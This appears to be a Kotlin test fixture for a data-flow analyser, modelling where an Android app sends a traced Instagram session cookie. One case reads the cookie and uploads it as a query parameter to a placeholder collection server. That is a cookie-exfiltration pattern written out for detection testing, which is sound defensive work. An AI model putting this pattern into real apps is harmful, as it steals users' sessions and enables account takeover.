// TEST SAMPLE ONLY — never runs (manifest hasCode="false"). Fake endpoints marked SIMULATION.
// Exists so PackPeek can tell where a traced value is sent. It sends nothing.
package sim.app.destination

import android.webkit.CookieManager
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.launch

/** A small HTTP helper like the ones apps wrap around OkHttp: the address comes from the caller. */
object Http {
    fun get(url: String, cookie: String?) {
        val c = URL(url).openConnection() as HttpURLConnection
        c.setRequestProperty("Cookie", cookie)
        c.responseCode
    }
}

class Api {
    /** A base address kept in a field, as API clients do. */
    private val base = "https://collect.sim-server.example/v1/"

    fun upload(data: String?) {
        (URL(base + "session?d=" + data).openConnection() as HttpURLConnection).responseCode
    }
}

class Main(private val scope: CoroutineScope, private val api: Api) {
    private fun cookie(): String? = CookieManager.getInstance().getCookie("https://www.instagram.com")

    /** 1. The cookie goes to Instagram itself, through a helper that receives the address. */
    fun toInstagram() {
        Http.get("https://i.instagram.com/api/v1/users/web_profile_info/", cookie())
    }

    /** 2. The cookie goes to the app's own server, from a coroutine, with the address in a field. */
    fun toOwnServer() {
        val c = cookie()
        scope.launch { api.upload(c) }
    }

    /** 3. Control: the cookie is read but only a fixed text goes to the server. */
    fun pingOnly() {
        if (cookie() != null) api.upload("ping")
    }
}
